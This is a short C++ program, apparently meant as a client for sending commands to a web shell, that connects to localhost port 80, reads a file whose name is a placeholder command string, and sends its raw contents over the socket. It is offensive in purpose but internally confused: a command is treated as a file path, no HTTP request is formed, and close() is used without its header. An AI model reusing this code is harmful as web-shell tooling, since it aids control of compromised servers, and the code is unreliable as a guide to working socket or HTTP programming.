#include <iostream>
#include <fstream>
#include <sstream>
#include <sys/socket.h>
#include <arpa/inet.h>

int main() {
    int sock;
    if ((sock = socket(AF_INET, SOCK_STREAM, 0)) == -1) {
        std::cerr << "Error creating socket\n";
        return 1;
    }

    sockaddr_in server_addr;
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(80);
    inet_pton(AF_INET, "127.0.0.1", &server_addr.sin_addr);

    if (connect(sock, (sockaddr *)&server_addr, sizeof(server_addr)) == -1) {
        std::cerr << "Error connecting to web shell\n";
        return 2;
    }

    std::string command = "<YOUR_COMMAND_HERE>";
    std::ifstream file(command.c_str());
    std::stringstream buffer;
    buffer << file.rdbuf();
    std::string web_shell_code = buffer.str();

    if (send(sock, web_shell_code.c_str(), web_shell_code.size(), 0) == -1) {
        std::cerr << "Error sending command to web shell\n";
        return 3;
    }

    close(sock);

    return 0;
}
